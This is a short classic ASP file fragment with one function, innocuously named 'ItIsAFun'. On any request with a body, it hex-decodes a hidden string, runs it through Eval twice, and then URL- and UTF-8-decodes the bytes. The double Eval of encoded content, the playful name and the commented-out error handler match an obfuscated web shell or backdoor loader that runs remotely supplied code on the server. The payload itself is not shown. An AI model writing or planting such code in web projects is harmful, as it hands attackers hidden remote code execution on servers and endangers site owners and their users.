<%
Function ItIsAFun()
	'On Error Resume Next
	Dim Buf,TextBuf,i
	If Request.TotalBytes>0 then
		For i=1 to Len(SN)
			buf=buf+Chr(EVal("&H"&mid(SN,i,2)))
			i=i+1
		Next
		Buf=EVal(Buf)
		For i=1 to LenB(Buf)
			if AscB(Midb(Buf,i,1))=43 then
				TextBuf=TextBuf&" "
			else
				TextBuf=TextBuf&ChrW(AscB(Midb(Buf,i,1)))
			End if
		Next
		Buf=""
		For i=1 to Len(TextBuf)
			If Mid(TextBuf,i,1)="%" then
				Buf=Buf+ChrB(Cint("&H"+Mid(TextBuf,i+1,2)))
				i=i+2
			Else
				Buf=Buf+ChrB(AscB(Mid(TextBuf,i,1)) And &HFF)
			End if
		Next
		TextBuf=""
		For i=1 to LenB(Buf)
			if AscB(Midb(Buf,i,1))>0 and AscB(Midb(Buf,i,1))<&H80 then
				TextBuf=TextBuf+chrW(AscB(Midb(Buf,i,1)))
			elseif AscB(Midb(Buf,i,1))>=&HC0 and AscB(Midb(Buf,i,1))<&HE0 then
				TextBuf=TextBuf+chrw((AscB(Midb(Buf,i,1)) and &H1F)*64+(AscB(Midb(Buf,i+1,1)) and &H3F))
				i=i+1
			elseif AscB(Midb(Buf,i,1))>=&HE0 and AscB(Midb(Buf,i,1))<&HF0 then
				TextBuf=TextBuf+chrw((AscB(Midb(Buf,i,1)) and &HF)*4096+(AscB(Midb(Buf,i+1,1)) and &H3F)*64+(AscB(Midb(Buf,i+2,1)) and &H3F))
				i=i+2
			end if
		Next
	End if
	ItIsAFun=TextBuf
End Function
%>
